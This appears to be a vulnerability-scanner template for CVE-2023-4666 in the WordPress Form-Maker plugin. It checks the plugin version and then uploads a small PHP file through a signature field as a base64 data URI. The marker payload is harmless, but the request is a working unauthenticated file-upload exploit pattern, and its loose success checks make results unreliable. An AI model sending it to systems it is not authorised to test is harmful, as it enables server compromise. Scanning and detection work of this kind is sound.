---
id: CVE-2023-4666

info:
  name: Form-Maker < 1.15.20 - Unauthenticated Arbitrary File Upload
  author: intelligent-ears
  severity: critical
  description: |
    The Form-Maker plugin for WordPress before version 1.15.20 does not
    validate signatures when creating them from user input, allowing
    unauthenticated users to upload arbitrary PHP files via signature fields.
  reference:
    - https://wpscan.com/vulnerability/c6597e36-02d6-46b4-89db-52c160f418be
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-4666
    cwe-id: CWE-434
  metadata:
    verified: true
    max-request: 2
  tags: cve,cve2023,wordpress,wp-plugin,rce,fileupload,unauth

variables:
  test_marker: "{{rand_text_alpha(12)}}"
  form_id: "{{rand_int(1,999)}}"
  element_id: "{{rand_int(1,99)}}"
  php_code: "<?php echo '{{rand_text_alpha(8)}}'; ?>"
  sig_prefix: "signature-file-wdform_{{form_id}}_element_section"
  signature_field: "{{sig_prefix}}{{element_id}}"
  form_data1: "wdform_{{form_id}}_element_section{{element_id}}="
  form_data2: "&{{signature_field}}=data:image/php;base64,{{base64(php_code)}}"
  form_data3: "&form_id={{form_id}}&page=0&form_id_temp={{form_id}}"
  form_data4: "&submit{{form_id}}={{rand_text_alpha(6)}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/form-maker/readme.txt"
    matchers:
      - type: regex
        part: body
        regex:
          - "Stable tag: (0\\.|1\\.(0\\.|1[0-4]\\.|15\\.(0|1[0-9])))"

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        {{form_data1}}{{form_data2}}{{form_data3}}{{form_data4}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302
      - type: word
        part: body
        words:
          - "Thank you"
          - "successfully"
          - "submitted"
          - "form_id"
          - "wdform"
        condition: or
      - type: word
        part: body
        words:
          - "honeypot"
          - "blocked"
          - "suspicious"
          - "security"
        condition: or
        negative: true
      - type: dsl
        dsl:
          - "!contains(body, 'POST /')"
          - "!contains(body, 'GET /')"
          - "!contains(body, 'HTTP/1.1')"
        condition: and
